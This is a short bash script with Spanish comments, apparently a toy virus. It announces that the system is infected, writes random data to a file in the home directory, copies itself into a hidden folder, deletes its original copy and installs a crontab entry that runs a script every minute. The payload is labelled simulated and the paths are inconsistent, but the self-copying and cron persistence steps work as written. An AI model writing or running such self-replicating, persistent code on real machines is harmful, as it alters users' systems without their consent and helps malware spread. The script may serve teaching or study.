#!/bin/bash

echo "¡Tu sistema está infectado! 😈"

## payload simulado
dd if=/dev/urandom of=$HOME/infectado.txt bs=512 count=1

## propagacion
HIDDEN="$HOME/.infectado"
mkdir $HIDDEN
cp $(realpath "$0") $HIDDEN

## destruccion
if [ $(realpath "$0") != "$HIDDEN/gnomed.bash" ]; then
rm -- ${0}
fi

## ejecucion automatica
(crontab -l 2>/dev/null; echo "* * * * * /home/usuario/test.bash") | crontab -
